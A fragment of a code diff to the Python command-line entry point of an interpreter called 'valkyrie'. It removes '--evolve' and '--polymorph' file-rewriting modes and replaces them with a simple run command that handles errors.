-        with open(sys.argv[2], 'r') as f:
-            code = f.read()
-        gens = int(sys.argv[3]) if len(sys.argv) > 3 else 5
-        evolved = vk.evolve(code, gens)
-        output = sys.argv[2].replace('.vk', f'_evolved_{gens}g.vk')
-        with open(output, 'w') as f:
-            f.write(evolved)
-        print(f"Evolved code written to {output}")
-    
-    elif sys.argv[1] == '--polymorph':
-        if len(sys.argv) < 3:
-            print("Usage: valkyrie --polymorph <file.vk>")
-            return
-        with open(sys.argv[2], 'r') as f:
-            code = f.read()
-        variant = vk.polymorphic.mutate(code)
-        output = sys.argv[2].replace('.vk', '_variant.vk')
-        with open(output, 'w') as f:
-            f.write(variant)
-        print(f"Polymorphic variant written to {output}")
-    
-    else:
-        with open(sys.argv[1], 'r') as f:
+    try:
+        with open(filename, 'r', encoding='utf-8') as f:
             source = f.read()
-        vk.run(source)
+        interpreter.run(source)
+    except FileNotFoundError:
+        print(f"Error: File '{filename}' not found")
+        sys.exit(1)
+    except Exception as e:
+        print(f"Error: {e}")
+        import traceback
+        traceback.print_exc()
+        sys.exit(1)
 
-if __name__ == '__main__':
+
+if __name__ == "__main__":
     main()
